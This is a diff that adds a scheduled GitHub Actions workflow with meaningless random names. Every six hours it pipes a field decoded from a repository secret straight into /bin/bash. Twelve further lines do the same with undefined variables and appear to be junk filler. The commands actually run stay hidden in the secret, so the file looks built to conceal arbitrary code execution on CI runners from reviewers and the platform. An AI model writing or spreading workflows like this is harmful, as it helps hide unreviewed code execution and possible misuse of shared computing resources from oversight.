@@ -1,0 +1,29 @@
+name: xinlvfajie
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xinlvfajie
+        env:
+          p63: ${{ secrets.p63 }}
+        run: |
+          echo $p63 | jq -r .womx885 | /bin/bash
+          echo $xf83364 | jq -r .piovg21173 | /bin/bash
+          echo $keuaz4973 | jq -r .mfds3 | /bin/bash
+          echo $iyib798 | jq -r .v4428 | /bin/bash
+          echo $digr661 | jq -r .xes7743 | /bin/bash
+          echo $bn28358 | jq -r .xw0 | /bin/bash
+          echo $kcn62 | jq -r .q3 | /bin/bash
+          echo $pbq9212 | jq -r .rsuy3924 | /bin/bash
+          echo $iv47 | jq -r .vqhzd6175 | /bin/bash
+          echo $xagb8274 | jq -r .waqv997 | /bin/bash
+          echo $szyu80 | jq -r .gap6 | /bin/bash
+          echo $yeeoa9 | jq -r .yrtqh6 | /bin/bash
+          echo $n84 | jq -r .fd31 | /bin/bash
+
